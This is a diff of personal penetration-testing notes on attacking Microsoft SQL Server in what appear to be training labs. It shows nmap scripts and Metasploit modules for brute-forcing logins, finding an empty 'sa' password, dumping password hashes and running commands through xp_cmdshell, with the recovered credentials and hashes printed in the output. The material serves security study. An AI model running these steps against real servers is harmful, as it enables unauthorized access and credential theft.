@@ -2576,24 +2576,116 @@ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.t
 (if successfull you are able to run commands in a shell remotely)
 
 
-- map ip -p port --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cdm="type c\flag.txt"   
+- map ip -p port --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cdm="type C:\\flag.txt"   
 	(flag is windows version of cat (read a file))
 
 
 -- LAB -- 
 
 
+1. Identify MSSQL Database Server 
+   
+   1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
+
+   
+   
+2. Find information from the MSSQL server with NTLM.
+   
+   root@attackdefense:~# nmap 10.2.22.77 -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433
+Starting Nmap 7.91 ( https://nmap.org ) at 2023-06-14 20:41 IST
+Nmap scan report for 10.2.22.77
+Host is up (0.0067s latency).
+
+PORT     STATE SERVICE
+1433/tcp open  ms-sql-s
+| ms-sql-ntlm-info: 
+|   Target_Name: MSSQL-SERVER
+|   NetBIOS_Domain_Name: MSSQL-SERVER
+|   NetBIOS_Computer_Name: MSSQL-SERVER
+|   DNS_Domain_Name: MSSQL-Server
+|   DNS_Computer_Name: MSSQL-Server
+|_  Product_Version: 10.0.14393
+
+   
+3. Enumerate all valid MSSQL users and passwords
+   
+  root@attackdefense:~# nmap 10.2.22.77 -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt 
+Starting Nmap 7.91 ( https://nmap.org ) at 2023-06-14 20:45 IST
+Nmap scan report for 10.2.22.77
+Host is up (0.0058s latency).
+
+PORT     STATE SERVICE
+1433/tcp open  ms-sql-s
+| ms-sql-brute: 
+|   [10.2.22.77:1433]
+|     Credentials found:
+|       auditor:jasmine1 => Login Success
+|       dbadmin:bubbles1 => Login Success
+|_      admin:anamaria => Login Success
+
+ 
+   
+4. Identify 'sa' user password
+   
+   root@attackdefense:~# nmap 10.2.22.77 -p 1433 --script ms-sql-empty-password                     
+Starting Nmap 7.91 ( https://nmap.org ) at 2023-06-14 20:46 IST
+Nmap scan report for 10.2.22.77
+Host is up (0.0071s latency).
+
+PORT     STATE SERVICE
+1433/tcp open  ms-sql-s
+| ms-sql-empty-password: 
+|   [10.2.22.77:1433]
+|_    sa:empty => Login Success
+
+
+   
+5. Execute MSSQL query to extract sysusers
+   
+![[Pasted image 20230614172347.png]]
+   
+   
+   
+   
+6. Dump MSSQL users hashes
+   
+   root@attackdefense:~# nmap 10.2.22.77 -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
+Starting Nmap 7.91 ( https://nmap.org ) at 2023-06-14 20:57 IST
+Nmap scan report for 10.2.22.77
+Host is up (0.0063s latency).
+
+PORT     STATE SERVICE
+1433/tcp open  ms-sql-s
+| ms-sql-dump-hashes: 
+| [10.2.22.77:1433]
+|     sa:0x020011dbfaf35ba0d5e61a769e3604230fde23e5d3e01e7ff0ba3875cf75554803e2f1e1977b78de8f4489c95df9be979c02f1dec551300c109c408c427934815755b600c7e0
+|     ##MS_PolicyEventProcessingLogin##:0x0200191cf079f310fb475527ac320aba7a4e8d5c3567bef2462b96ce8a8629b7f986ed344aa0963ac3a096da77056dad77a457644431282e2aa2c2243bc635abc6bb5f52552c
+|     ##MS_PolicyTsqlExecutionLogin##:0x0200677385acfe08bb1119246cf20f9d17c3a0d86bbb1d48874725f2c2e0e021260b885d0ba067427e09afad9079e6759ad6497ee7f1ef3cd497d500585d7727eeba64426083
+|     admin:0x02003814edd67dcab815b733d877a0fe7ec3470185864bd673c7273ba76c31e000c15e9fae25a826f6ba03892e37d6a1acae17f171d21dad7b20d874ccc259bbf9fa2230b9c0
+|     Mssql:0x02001786154bb350ac708b5a4c3fc6b90dc68418a13ba5fcb76b155f8eee14d72988edb559d9a2d0d6fd5dd25b1fab8431c0ca424d747a5743624c30aa772b40c8f23c66e6a4
+|     Mssqla:0x0200987f06858112a7fa0c70fe3f53c64061b35ae864782fc9cfcda3954ed60ca7e47e8497a571d177edb596f125cb529d7b2753e4d8e913c2b127a12207e3bcb75f70e29cb5
+|     auditor:0x020061cbe8509dfea47fbc20be854c4ac517bf6aa67f9f7c12d7d1efb1f500be279643c6cd19d370f9eff4f2d9b981a16f6916bc4534e8ba42d718f8b908fbfffb40d5cc1a5e
+|_    dbadmin:0x02000d6c6a0d55f536f9dbff2d8cc1e0965c550e1a1a1e7c6df8b7e6534ab817408f86dd9592b206862c4b7a3d1f6ca85f439360171d7c5143d6fba8606675dbaf5bea40d15b
+
+   
+   
+
+7. Execute a command on MSSQL to retrieve the flag. (The flag is located inside C:\flag.txt)
 
 
 
+root@attackdefense:~# nmap 10.2.22.77 -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type C:\flag.txt"
 
 
-
-
-
-
-
-
+PORT     STATE SERVICE
+1433/tcp open  ms-sql-s
+| ms-sql-xp-cmdshell: 
+|   10.2.22.77:1433
+|     Command: type C:\flag.txt
+|       output
+|       ======
+|_      1d1803570245aa620446518b2154f324
+ 
 
 
 
@@ -2602,6 +2694,7 @@ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.t
 
 - run service scan on sql ports 
 - run script for ms-sql-info (--script ms-sql-info)
+  
 - use metasploit to bruteforce logon info 
 	- use aux scanner for ms-sql : mssql_login 
 	- setg rhost ip (setg stays persistent)
@@ -2609,11 +2702,48 @@ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.t
 	- set set pass_file /root/desktop.wordlist/100-common-passwords.txt 
 	  
 - use another scanner: auxiliary/admin/mssql/mssql_enum 
+  
 - use enum module: auxiliary/admin/mssql/mssql_sql_logins 
+  
 - check if you can run commands: use auxiliary/admin/mssql/mssql_exec 
 	- set cmd whoami 
+	  
 - enumerate domain accounts:   use auxiliary/admin/mssql/mssql_enum_domain_accounts
 
 
 Domain accounts, in the context of Microsoft SQL Server, refer to user accounts that are managed and authenticated by a Windows Active Directory domain. These accounts are used to provide access to various resources within a domain, including SQL Server databases 
 
+-- Lab --
+
+
+- Discover valid users and their passwords
+  
+  msf6 auxiliary(scanner/mssql/mssql_login) > run
+
+[] 10.2.24.7:1433        - 10.2.24.7:1433 - MSSQL - Starting authentication scanner.
+[+] 10.2.24.7:1433        - 10.2.24.7:1433 - Login Successful: WORKSTATION\sa:
+[+] 10.2.24.7:1433        - 10.2.24.7:1433 - Login Successful: WORKSTATION\dbadmin:anamaria
+[+] 10.2.24.7:1433        - 10.2.24.7:1433 - Login Successful: WORKSTATION\auditor:nikita
+[] 10.2.24.7:1433        - Scanned 1 of 1 hosts (100% complete)
+
+  
+  
+- Enumerate MSSQL configuration
+  
+  ![[Pasted image 20230614174714.png]]
+
+
+
+- Enumerate all MSSQL logins
+  
+  ![[Pasted image 20230614174912.png]]
+  ![[Pasted image 20230614175419.png]]
+  
+- Execute a command on the target machine
+  
+  ![[Pasted image 20230614175134.png]]
+  
+  
+- Enumerate all available system users
+
+![[Pasted image 20230614175215.png]]
